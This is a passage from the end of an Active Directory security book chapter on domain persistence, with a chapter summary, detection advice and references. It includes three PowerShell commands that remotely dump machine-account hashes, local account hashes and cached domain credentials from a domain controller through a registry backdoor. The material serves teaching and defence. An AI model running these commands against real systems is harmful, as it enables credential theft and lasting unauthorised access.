<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.39 – Setting backdoors on the domain controller for user renly.baratheon</p>
<p>Now, we <a id="_idIndexMarker680"/>can confirm <a id="_idIndexMarker681"/><span class="No-Break">PS-Remoting access.</span></p>
<div>
<div class="IMG---Figure" id="_idContainer209">
<img alt="Figure 7.40 – The PS-Remoting backdoor in action" height="160" src="image/B18964_07_40.jpg" width="816"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 7.40 – The PS-Remoting backdoor in action</p>
<p>The <a id="_idIndexMarker682"/>registry backdoor allows <a id="_idIndexMarker683"/>an attacker to retrieve the machine account hash (the Silver Ticket), the local account hashes, and the domain-cached credentials. The backdoor opens the remote registry, retrieves <strong class="source-inline">BootKey</strong>, uses it to decrypt the LSA key, and then, with the help of that key, decrypts the <span class="No-Break"><strong class="source-inline">MachineAccount</strong></span><span class="No-Break"> hash:</span></p>
<pre class="console">
Get-RemoteMachineAccountHash -ComputerName kingslanding -Verbose
Get-RemoteLocalAccountHash -ComputerName kingslanding -Verbose
Get-RemoteCachedCredential -ComputerName kingslanding -Verbose</pre> <p>This backdoor can be detected if log events with ID <strong class="source-inline">4670</strong> (<strong class="bold">Permissions on an object were changed</strong>) <span class="No-Break">are detected.</span></p>
<h1 id="_idParaDest-146"><a id="_idTextAnchor161"/>Summary</h1>
<p>In conclusion, there are many ways for attackers to achieve persistence in compromised environments. This can be achieved at a domain level or by accessing a domain controller. We saw how powerful forged tickets are and how difficult is to detect their usage if an adversary follows OpSec recommendations. We also explored various ACL and attribute modifications. As usual, the devil is in the details, and in a complex environment, detection of such techniques can be tricky. We saw DCShadow and Golden gMSA attacks in practice. We dived deep into the topic of domain controller persistence, showing ways to collect clear-text passwords. Finally, we discussed security descriptors and possible ways to backdoor <span class="No-Break">a system.</span></p>
<p>In the following chapter, we will focus on attacking AD Certificate Services, which is a privileged target in the <span class="No-Break">Windows environment.</span></p>
<h1 id="_idParaDest-147"><a id="_idTextAnchor162"/>References</h1>
<ol>
<li>A comment about the November 2021 <span class="No-Break">update: </span><a href="https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver"><span class="No-Break">https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver</span></a></li>
<li>PAC requestor and Golden Ticket <span class="No-Break">attacks: </span><a href="https://www.varonis.com/blog/pac_requestor-and-golden-ticket-attacks"><span class="No-Break">https://www.varonis.com/blog/pac_requestor-and-golden-ticket-attacks</span></a></li>
<li>Detect malicious activity by checking checksums and ticket <span class="No-Break">times: </span><a href="https://www.trustedsec.com/blog/red-vs-blue-kerberos-ticket-times-checksums-and-you/"><span class="No-Break">https://www.trustedsec.com/blog/red-vs-blue-kerberos-ticket-times-checksums-and-you/</span></a></li>
<li>The WonkaVision <span class="No-Break">tool: </span><a href="https://github.com/0xe7/WonkaVision"><span class="No-Break">https://github.com/0xe7/WonkaVision</span></a></li>
<li>Inserting SID <span class="No-Break">History: </span><a href="https://www.thehacker.recipes/ad/persistence/sid-history"><span class="No-Break">https://www.thehacker.recipes/ad/persistence/sid-history</span></a></li>
<li><span class="No-Break">ServerUntrustAccount: </span><a href="https://github.com/STEALTHbits/ServerUntrustAccount"><span class="No-Break">https://github.com/STEALTHbits/ServerUntrustAccount</span></a></li>
<li>DCShadow <span class="No-Break">script: </span><a href="https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1"><span class="No-Break">https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1</span></a></li>
<li>The GoldenGMSA <span class="No-Break">tool: </span><a href="https://github.com/Semperis/GoldenGMSA"><span class="No-Break">https://github.com/Semperis/GoldenGMSA</span></a></li>
<li>A remote Skeleton Key <span class="No-Break">attack: </span><a href="https://adsecurity.org/?p=1275"><span class="No-Break">https://adsecurity.org/?p=1275</span></a></li>
<li>ACE <span class="No-Break">explained: </span><a href="https://helgeklein.com/blog/permissions-a-primer-or-dacl-sacl-owner-sid-and-ace-explained/"><span class="No-Break">https://helgeklein.com/blog/permissions-a-primer-or-dacl-sacl-owner-sid-and-ace-explained/</span></a></li>
</ol>
</div>
</div></body></html>